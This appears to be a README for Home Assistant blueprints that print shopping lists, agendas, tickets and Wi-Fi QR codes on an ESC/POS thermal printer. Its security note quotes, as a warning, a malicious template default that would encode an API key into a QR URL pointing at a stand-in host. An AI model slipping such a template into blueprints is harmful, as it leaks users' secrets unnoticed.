# Blueprints for ha-escpos-thermal-printer

Ready-to-import [Home Assistant blueprints](https://www.home-assistant.io/docs/blueprint/) — automations and scripts that exercise the integration's services for common day-to-day workflows. Pick one, click *Import*, fill in your printer and a few inputs, and it runs.

## How to import

The fastest way is to click the **Import** badge next to a blueprint in the table below — it opens HA's import dialog with the URL pre-filled. (The badges use the [`my.home-assistant.io`](https://my.home-assistant.io/) redirect, which Home Assistant Companion handles on phones and the desktop browser does on laptops.)

Manual import works too:

1. In Home Assistant, go to **Settings → Automations & Scenes**.
2. Switch to the **Blueprints** tab.
3. Click **Import Blueprint** in the bottom-right.
4. Paste the **raw GitHub URL** of the blueprint file (the blueprint name in the table below links to it).
5. *Import*. The blueprint is now available under "Create automation / script from blueprint."

## Available blueprints

| Blueprint | Type | Import | What it does |
|-----------|------|--------|--------------|
| [Shopping List](script/escpos_printer/shopping_list.yaml) | Script | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fscript%2Fescpos_printer%2Fshopping_list.yaml) | Print all open items from a `todo` entity as a bordered, tabulated shopping list. |
| [TODO List](script/escpos_printer/todo_list.yaml) | Script | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fscript%2Fescpos_printer%2Ftodo_list.yaml) | Generic counterpart to *Shopping List* — any `todo` entity, optional completed items, optional numbering. |
| [Daily Agenda](automation/escpos_printer/daily_agenda.yaml) | Automation | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fautomation%2Fescpos_printer%2Fdaily_agenda.yaml) | At a fixed time each day, print today's calendar events as a time → event KV table. |
| [Weather Forecast](script/escpos_printer/weather_forecast.yaml) | Script | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fscript%2Fescpos_printer%2Fweather_forecast.yaml) | Print an N-day forecast as a Day / Hi / Lo / Condition table. |
| [Receipt](script/escpos_printer/receipt.yaml) | Script | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fscript%2Fescpos_printer%2Freceipt.yaml) | Print a styled receipt — large serif header, line items, subtotal + tax + total. |
| [Recipe Card](script/escpos_printer/recipe_card.yaml) | Script | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fscript%2Fescpos_printer%2Frecipe_card.yaml) | Print a kitchen-friendly recipe card with a serif name, servings, ingredients, and numbered steps. |
| [Sensor Alert](automation/escpos_printer/sensor_alert.yaml) | Automation | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fautomation%2Fescpos_printer%2Fsensor_alert.yaml) | When a sensor reaches a target state, print a bordered alert with its current value and a timestamp. |
| [TODO Item](automation/escpos_printer/todo_item.yaml) | Automation | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fautomation%2Fescpos_printer%2Ftodo_item.yaml) | When items are added to a `todo` entity, print a small bordered card per new item. |
| [TODO Ticket (with QR)](automation/escpos_printer/todo_ticket.yaml) | Automation | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fautomation%2Fescpos_printer%2Ftodo_ticket.yaml) | Upgraded TODO Item — prints a job-ticket-style slip per task with a large serif title, due date, description, and a QR code that opens the original task (Todoist by default; templatable for any back-end). |
| [Doorbell Snapshot](automation/escpos_printer/doorbell_snapshot.yaml) | Automation | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fautomation%2Fescpos_printer%2Fdoorbell_snapshot.yaml) | When a doorbell/motion sensor fires, print a captioned camera snapshot — title, the live frame, and a timestamp. |
| [Morning Briefing](automation/escpos_printer/morning_briefing.yaml) | Automation | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fautomation%2Fescpos_printer%2Fmorning_briefing.yaml) | At a fixed time each morning, print a combined slip — date header, weather forecast, today's agenda, and a templated footer line. Each section is optional. |
| [Trash & Recycling Reminder](automation/escpos_printer/trash_reminder.yaml) | Automation | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fautomation%2Fescpos_printer%2Ftrash_reminder.yaml) | The night before pickup, print which bins go out tomorrow. Configure once per weekday — empty days are skipped. |
| [Guest Wi-Fi QR](script/escpos_printer/guest_wifi_qr.yaml) | Script | [![Open your Home Assistant instance and show the blueprint import dialog with a specific blueprint pre-filled.](https://my.home-assistant.io/badges/blueprint_import.svg)](https://my.home-assistant.io/redirect/blueprint_import/?blueprint_url=https%3A%2F%2Fgithub.com%2Fcognitivegears%2Fha-escpos-thermal-printer%2Fblob%2Fmain%2Fblueprints%2Fscript%2Fescpos_printer%2Fguest_wifi_qr.yaml) | Print a scannable Wi-Fi QR code (WPA/WEP/open) plus the SSID/password as fallback text. |

## Integration recipes

Deeper recipes for combining blueprints with specific HA integrations:

- **[UniFi Guest Wi-Fi](UNIFI_GUEST_WIFI.md)** — about 10 minutes of setup. If you already have the [official HA UniFi integration](https://www.home-assistant.io/integrations/unifi/) installed, this adds two Lovelace buttons (Print current / Rotate now) and a monthly auto-rotate. Reuses the credentials the integration already stored — no `.env` files, no extra helpers.

## Per-blueprint notes

### Shopping List

**Inputs:** printer · `todo_entity` · `title` (default "Shopping List") · `style`
**Requires:** the [Todo integration](https://www.home-assistant.io/integrations/todo/) (any provider — local, Google Tasks, etc.)
**Notes:** prints only items with status `needs_action`; if the list is empty it prints a "(nothing to buy)" box so you know the print succeeded.

### TODO List

**Inputs:** printer · `todo_entity` · `title` (auto from entity friendly name) · `include_completed` · `numbered` · `style`
**Use this over Shopping List when:** the entity isn't groceries (chores, packing, projects) or you want completed items / numbering. The two share the same underlying mechanism — Shopping List is the curated grocery preset.

### Daily Agenda

**Inputs:** printer · `calendar_entity` · `print_time` (default 07:00) · `lookahead_hours` · `max_title_length` · `style`
**Trigger:** time of day. Prints once per fire; if there are no events the table contains a single "No events today" row. `max_title_length` truncates long event names so they fit a narrow printer.

### Weather Forecast

**Inputs:** printer · `weather_entity` · `days` · `title` · `max_condition_length`
**Requires:** weather provider that supports `weather.get_forecasts` with `type: daily`. `max_condition_length` truncates the condition string (e.g. "partlycloudy") so the table fits.

### Receipt

**Inputs:** printer · `title` · `items` (list of `{name, price}`) · `currency` · `tax_rate`
**Notes:** subtotal/tax/total are computed automatically. Uses the bundled `dejavu_serif` font for the title. Line items render as a label/value table; an empty `items` list prints "(no items)" instead of an empty table.

### Recipe Card

**Inputs:** printer · `name` · `servings` · `ingredients` (one per line) · `steps` (one per line, auto-numbered) · `style`
**Notes:** ingredients and steps render as bordered tables (steps numbered in the left column). Empty blocks print "(no ingredients)" / "(no steps)" so the rest of the card still prints.

### Sensor Alert

**Inputs:** printer · `sensor` · `target_state` · `alert_title` · `style`
**Notes:** fires on transitions *into* `target_state`. To alert on *any* change, set `target_state` to a state that won't naturally match (e.g. `"__never__"`) and edit the trigger to drop the `to:` filter.

### TODO Item vs TODO Ticket — which one?

Both watch a `todo` entity and print when items get added. They differ on output:

| | **TODO Item** | **TODO Ticket** |
|---|---|---|
| Format | Small bordered card per item | Job-ticket slip: bold title + Due/List/Added KV table + optional description + optional QR back-link to the source task |
| Inputs | Minimal (5) | More (11) |
| Best for | "Mark items, get a slip — fridge-magnet aesthetic" | "I want to scan the QR back to Todoist and look at attachments / comments" |
| Diff key | `summary` (titles must be unique within the list) | `uid` (stable across renames) |
| Cuts per item | Yes (configurable) | Yes (configurable) |

Pick TODO Item if you just want minimal slips. Pick TODO Ticket if you use Todoist / CalDAV / Apple Reminders / Google Tasks and want a scannable QR back to the source task. Don't run both on the same todo entity simultaneously — they'd both fire on the same state change and produce duplicate prints.

### TODO Item

**Inputs:** printer · `todo_entity` · `style` · `max_items_per_trigger` · `cut_per_item`
**Notes:** HA does not fire per-item events for todo lists; the blueprint compares the entity's `items` attribute between the previous and current state and prints what's new. `max_items_per_trigger` is a safety cap against bulk-sync floods. `cut_per_item: false` keeps a batch of items on one slip with a single cut at the end.

### TODO Ticket (with QR)

**Inputs:** printer · `todo_entity` · `header_text` · `print_qr` · `url_template` · `qr_size` · `print_description` · `max_description_length` · `max_items_per_trigger` · `cut_per_item` · `style`
**Notes:** the richer counterpart to TODO Item — each new task prints as a job-ticket slip with a bold double-width title, a Due/List/Added KV table, optional description, and a QR code linking back to the source task. Pure text mode (no raster image commands) so it works on the widest set of ESC/POS printers including image-less Bluetooth POS-58 units. `url_template` is a Jinja template with `uid` / `summary` / `due` / `description` in scope; the default targets Todoist (`https://app.todoist.com/app/task/{{ uid }}`). For other back-ends:

- **Todoist:** keep the default (the HA Todoist integration exposes Todoist's task ID as `uid`).
- **CalDAV / Apple Reminders:** items expose a `uid` but the URL scheme is provider-specific — set `url_template` to your provider's deep-link pattern.
- **Google Tasks:** `uid` is the API ID; Google doesn't publish a stable deep-link, so either set `print_qr: false` or template a search URL like `https://tasks.google.com/embed/?source=ha&q={{ summary | urlencode }}`.
- **Local todo (HA-native list):** no per-item URLs — set `print_qr: false`.

The QR is skipped automatically if the item has no `uid`, so the same blueprint is safe across mixed back-ends.

**Security note — read before importing a third-party fork.** `url_template` is rendered with HA's full template scope, which includes `states.*` and (via `state_attr`) the contents of any helper or sensor in your installation. The defaults shipped with this repo only use the per-task variables `uid` / `summary` / `due` / `description`. A malicious fork could ship a default like `https://x.example/?d={{ states.input_text.openai_api_key }}` — the user wouldn't notice because the payload is encoded into a QR (humans don't read QRs, but their phones do). Before importing this blueprint from anywhere other than upstream, open the YAML and read the `url_template` default. If you only want the per-task variables and nothing else, leave the default in place; if you want a different URL pattern, set it to a plain string with `{{ uid }}` substitution and nothing else.

**Emoji caveat:** the blueprint renders task summaries in the printer's hardware text mode (codepage CP437 etc.), which does not include emoji glyphs. Tasks like "🛒 Groceries" will print the leading emoji as `?` and the rest fine. If you need emoji, either strip them in a `script:` wrapper before adding the task, or fork the blueprint to switch the title back to `print_text_image` with a custom emoji-capable TTF (`<config>/fonts/NotoColorEmoji.ttf` for example) — at the cost of requiring a printer that supports raster image commands.

### Doorbell Snapshot

**Inputs:** printer · `trigger_entity` · `target_state` · `camera_entity` · `title` · `rotation` · `dither` · `style`
**Notes:** fires on transitions *into* `target_state` (defaults to `"on"` — matches typical binary_sensor / motion / button entities). Uses `print_camera_snapshot` so the frame is captured live at print time. `dither: floyd-steinberg` works best for colour camera feeds; switch to `threshold` for cartoon overlays or text-heavy UIs. The snapshot service call carries `continue_on_error: true` so a camera that's offline / mid-reboot still produces a title + "From" / "Time" slip — you get *something* on paper rather than a silently-skipped automation. This blueprint inherently requires a printer that supports raster image commands.

### Morning Briefing

**Inputs:** printer · `print_time` (default 07:00) · `title` · `weather_entity` (optional) · `forecast_days` · `max_condition_length` · `calendar_entity` (optional) · `lookahead_hours` · `max_title_length` · `footer` · `style`
**Notes:** each section is conditional — leave the weather or calendar entity blank and the matching section is skipped. The `footer` input is a Jinja template (e.g. `"Sunrise {{ state_attr('sun.sun', 'next_rising') | as_timestamp | timestamp_custom('%H:%M', true) }}"`); leave blank to skip.

### Trash & Recycling Reminder

**Inputs:** printer · `print_time` (default 19:00) · `offset_days` (default 1 = tomorrow) · `title` · `monday`..`sunday` · `style`
**Notes:** fires every day at `print_time` and looks at the *target* weekday — `offset_days = 1` (default) gives the classic "night before pickup" pattern; `offset_days = 0` with an earlier `print_time` (06:30, say) gives a morning-of reminder. If the matching day input is empty, no print happens — so you can leave the off days blank and the reminder only fires on the days before pickup. Bin descriptions can be a single label ("Trash") or several ("Trash + Yard Waste").

### Guest Wi-Fi QR

**Inputs:** printer · `ssid` · `password` · `security` (WPA / WEP / nopass) · `hidden` · `title` · `qr_size` · `show_password`

#### Quick start (works on any router — about 2 minutes)

You do not need a UniFi controller, an API, or any extra integrations. This is the path 90% of users want:

1. Click the **Import** badge for "Guest Wi-Fi QR" in the table above. HA opens the blueprint import dialog with the URL pre-filled — confirm.
2. Go to **Settings → Automations & Scenes → Scripts**. Click **+ Add Script** → **Create script from blueprint** → pick **ESC/POS — Guest Wi-Fi QR**.
3. Fill in:
   - **Printer**: your ESC/POS device
   - **SSID**: your guest network name (typed literally, e.g. `MyHouse-Guest`)
   - **Password**: the Wi-Fi password (typed literally)
   - **Security**: usually `WPA` (covers WPA2 / WPA3 on modern phones)
   - Leave the rest at defaults
4. **Save**. The script appears as `script.escpos_guest_wifi_qr` (or whatever you named it).
5. Test: **Settings → Automations & Scenes → Scripts**, find your script, click **Run**. A slip with the QR + credentials prints. Scan it with your phone — you should get a "Join network" prompt.
6. Add a Lovelace button:

   ```yaml
   type: button
   name: Guest Wi-Fi
   icon: mdi:wifi
   tap_action:
     action: perform-action
     perform_action: script.escpos_guest_wifi_qr   # your script's entity_id
   ```

That's it. When you change the Wi-Fi password (or guests turn over and you want to rotate), just edit the script's inputs and save.

#### A bit nicer: store credentials in helpers

If you don't want to edit the script every time the password changes:

1. **Settings → Devices & Services → Helpers → + Create Helper → Text** — name it `Guest Wi-Fi SSID` (`input_text.guest_wifi_ssid` by default).
2. Repeat for **Guest Wi-Fi Password**, setting **Mode: Password** so it masks in the UI (`input_text.guest_wifi_password`).
3. Fill in the values once.
4. Edit your blueprint-based script (**Scripts → your guest wi-fi script → ⚙ Edit in YAML** or via the UI) and change the SSID and password inputs to:

   ```yaml
   ssid: "{{ states('input_text.guest_wifi_ssid') }}"
   password: "{{ states('input_text.guest_wifi_password') }}"
   ```

5. Save. Now you update the password by editing the helper, not the script. Useful when:
   - You let a non-technical household member rotate the password from a Lovelace text field.
   - You want the same value in multiple automations / templates.
   - You plan to automate rotation later (see below).

#### Automating rotation

If you have the [official HA UniFi integration](https://www.home-assistant.io/integrations/unifi/) installed, you can rotate the guest password on a schedule and reprint anytime: see [**UNIFI_GUEST_WIFI.md**](UNIFI_GUEST_WIFI.md) (~10 minutes of setup, one shell script, reuses the UniFi integration's stored credentials).

For other routers (OpenWrt, Mikrotik, etc.), the same shape works — replace the UniFi `curl` calls in `unifi_wifi.sh` with your router's API equivalent. For routers without an API (most ISP modems), rotate manually in the router UI, update your input_text helpers, and tap print.

#### Format & limitations

**Encoded format:** the ZXing "WIFI" URI scheme — `WIFI:T:<auth>;S:<ssid>;P:<password>;H:<hidden>;;`. Reserved characters (`\`, `;`, `,`, `:`, `"`) are backslash-escaped per spec. There is no IETF RFC or IEEE standard for this format, but every consumer QR scanner implements ZXing's: iOS Camera (15+), Google Camera, Android system scanner, Windows Camera, macOS Continuity Camera. Canonical reference: [ZXing Barcode Contents — Wi-Fi Network Config](https://github.com/zxing/zxing/wiki/Barcode-Contents#wi-fi-network-config-android-ios-11).

**Auth types supported:** `WPA` (covers WPA2 + WPA3 on iOS 17+ / modern Android — the radio negotiates the actual mode), `WEP` (legacy), `nopass` (open networks). **Not supported by this blueprint:** WPA2-Enterprise (EAP) and explicit WPA3-Personal (SAE) tags. EAP needs additional `E:`, `PH:`, `A:`, `I:` fields; SAE is `T:SAE` but most devices auto-negotiate from `T:WPA`. If you specifically need either, fork the blueprint and extend the `wifi_uri` template.

`show_password: false` prints just the QR for a more secure share — anyone seeing the slip can only join by scanning.

## Authoring your own blueprint

A blueprint is a single YAML file with a `blueprint:` metadata block plus the normal HA action shape — `trigger:` + `action:` for automations, `sequence:` for scripts. The `blueprint.input:` block declares what the user fills in when they create a script/automation from your blueprint.

### Workflow for your own HA install

1. **Copy an existing blueprint** as a starting template. Pick the one closest to your use case:

   | I want… | Start from |
   |---|---|
   | A state-trigger automation (sensor changes → print) | `automation/escpos_printer/sensor_alert.yaml` |
   | A time-trigger automation (fires at a fixed time) | `automation/escpos_printer/daily_agenda.yaml` |
   | A script with user-supplied form fields | `script/escpos_printer/receipt.yaml` |
   | A todo-diff (print on new items) | `automation/escpos_printer/todo_item.yaml` |
   | Camera snapshot on trigger | `automation/escpos_printer/doorbell_snapshot.yaml` |
   | A QR code script | `script/escpos_printer/guest_wifi_qr.yaml` |

2. **Drop the YAML** into `<config>/blueprints/<script|automation>/<your-author-slug>/<name>.yaml`.

3. **Reload** via **Settings → Automations & Scenes → Blueprints** (no HA restart needed).

4. **Create a script/automation from it** in the UI, fill in the inputs, save, run. Iterate by editing the file and reloading.

### Key concepts (the things that took the longest to internalise)

- **`!input foo`** is a YAML-level substitution at script-instantiation time. HA splices the input's literal value into the YAML at every `!input foo` site. Combine this with Jinja in the input value (e.g. a user-supplied template typed into a text field) and HA renders at run time with the action's local variable scope. See `morning_briefing.yaml`'s `footer:` input for the canonical example.
- **`mode:` is a top-level key**, sibling of `blueprint:` — not nested inside it. Use `mode: single` for time triggers (drops re-fires while a previous fire is still running); `mode: queued` + `max_exceeded: silent` for state triggers (avoids log spam on bulk state changes).
- **`selector:` defines the UI control.** `text: {}` is a free-form field, `boolean: {}` is a switch, `entity: {domain: todo}` is an entity picker filtered by domain, `device: {integration: escpos_printer}` is a device picker, `number: {min: 1, max: 16, step: 1}` is a number input, `select: {options: [a, b, c]}` is a dropdown.
- **Service `data:` fields are Jinja-rendered at call time.** Inside a templated value you can reference `trigger.to_state`, `repeat.item`, and any HA state (`states('sensor.foo')`).

### Minimal shapes

A complete minimal script blueprint:

```yaml
blueprint:
  name: My Script
  description: One-line summary.
  domain: script
  input:
    text:
      name: Text to print
      selector:
        text: {}
mode: queued
max_exceeded: silent
sequence:
  - service: escpos_printer.print_text_utf8
    data:
      text: !input text
  - service: escpos_printer.cut
```

A complete minimal automation blueprint:

```yaml
blueprint:
  name: My Automation
  description: One-line summary.
  domain: automation
  input:
    sensor:
      name: Sensor to watch
      selector:
        entity: {}
mode: queued
max_exceeded: silent
trigger:
  - platform: state
    entity_id: !input sensor
action:
  - service: escpos_printer.print_text_utf8
    data:
      text: "{{ trigger.to_state.name }} is now {{ trigger.to_state.state }}"
  - service: escpos_printer.cut
```

### Validating your blueprint

Three levels of validation, from lightest to strictest. Use whichever ones match how committed you are to shipping the blueprint to other people.

**Level 1 — Home Assistant itself, on import.** The cheapest check: drop the YAML into `<config>/blueprints/<domain>/<author>/<name>.yaml` and reload **Settings → Automations & Scenes → Blueprints**. If the YAML fails to parse or required keys are missing, HA shows the error in the blueprints list. If a *service* reference is wrong, that error only surfaces when you create a script/automation from the blueprint and run it. Fastest feedback loop for iterating; weakest at catching service-name typos.

**Level 2 — generic YAML syntax check.** If you don't have this repo cloned, run a vanilla YAML lint that understands HA's `!input` tag. The simplest path is `yamllint` via [`uvx`](https://github.com/astral-sh/uv):

```sh
uvx yamllint -d '{extends: default, rules: {line-length: disable, document-start: disable}}' my-blueprint.yaml
```

Catches: parse errors, indentation issues, duplicate keys. Doesn't catch: missing required `blueprint.*` fields, service-name typos, field-name drift.

**Level 3 — this repo's `validate_blueprints.py`.** If you've cloned `ha-escpos-thermal-printer`, the bundled validator is much stricter than YAML lint alone:

```sh
uv run python scripts/validate_blueprints.py path/to/your/blueprints/
```

Checks: YAML parse, required `blueprint.name` / `.description` / `.domain` / `.input` fields, `blueprint.domain` matches the directory layout, **every `service: escpos_printer.<name>` reference resolves against `services.yaml`**, and **every `data:` field name matches the service's voluptuous schema**. The service-call lint is the one Level 1 / Level 2 can't replicate — it catches typos like `print_text_utf` (missing `8`) and `data: { not_a_real_field: ... }` before a user ever hits run.

If your blueprint ships alongside markdown docs containing fenced bash, also run:

```sh
uv run python scripts/extract_markdown_bash.py path/to/your/blueprints/
```

Walks `*.md` under the path, extracts ```` ```bash ```` blocks, runs `shellcheck` against them, and smoke-execs any block that contains the password-generator pipeline 10× to catch SIGPIPE-class regressions.

For the unit-test equivalent (useful in your own CI):

```sh
uv run pytest tests/test_blueprints_yaml.py tests/test_markdown_bash.py -q
```

Pre-commit hooks in this repo run all three on every commit touching `blueprints/`. If you fork the repo, install pre-commit with `uvx pre-commit install` and the same gates run on your local commits.

### Sharing publicly

Push the YAML to a GitHub repo and share the **raw URL**. Others import via HA's **Import Blueprint** dialog (paste raw URL). For the one-click badge format used in the table above, generate the URL-encoded path via [`my.home-assistant.io`](https://my.home-assistant.io/) and wrap it in the standard badge `![…](…)` markup.

### Contributing back to this repo

In addition to all of the above:

- **File location must match `blueprint.domain`.** Scripts go under `blueprints/script/<author>/...`; automations under `blueprints/automation/<author>/...`. `scripts/validate_blueprints.py` catches drift.
- **Service references are linted** against `custom_components/escpos_printer/services.yaml` — a typo like `print_text_utf` (missing `8`) fails the validator. Field names in each `data:` block are likewise checked.
- **Use `print_text_utf8`, not `print_text`**, for any user-supplied text. `print_text_utf8` transcodes UTF-8 to the printer's codepage; `print_text` ships bytes raw (use it only for known-ASCII labels like "Notes" or "Total").
- **Sanitise text that lands in a layout cell** (`print_table`, `print_kvtable`) with the canonical chain `.replace('\n', ' ').replace('\r', ' ').replace('|', '/').replace('\t', ' ') | trim`. See `morning_briefing.yaml` line 196.
- **Default `style: auto`** for borders — the integration auto-picks the right glyph family per printer codepage. Don't hardcode `single` or `double` without a reason.
- **Avoid `print_text_image`** unless you need glyphs the printer's hardware codepage can't render (CJK, emoji, fancy fonts). Image commands aren't supported on every ESC/POS printer.
- **Validate locally** before pushing using the Level 3 commands documented under "Validating your blueprint" above. The same gates run via pre-commit (`uvx pre-commit install`) and in CI.
- **Add three things** in the same PR: a row in the "Available blueprints" table above with an import badge, a `### Your Blueprint Name` block under "Per-blueprint notes", and a bullet under `## [Unreleased]` `### Added` in `CHANGELOG.md`.

### Modifying an existing blueprint (fork or in-place)

Two options:

1. **Fork this repo**, edit the YAML, and import via the raw URL of your fork.
2. **Copy the YAML** straight into `<config>/blueprints/<domain>/<author>/<file>.yaml` on your HA host and edit in place. HA picks up the changes on the next blueprints-page reload.

### Resources

- [Home Assistant's official blueprint tutorial](https://www.home-assistant.io/docs/blueprint/tutorial/) — definitive reference for the YAML schema and selector types.
- [The 13 existing blueprints in this directory](.) — every common shape (state trigger, time trigger, todo-diff, image, QR, multi-column table, multi-section conditional) is represented. Pick the closest match and tweak.
- [`CLAUDE.md`](../CLAUDE.md) — repo conventions for service usage, sanitiser patterns, text-mode vs image-mode tradeoffs, and the validator / extractor / markdown-lint pipeline.
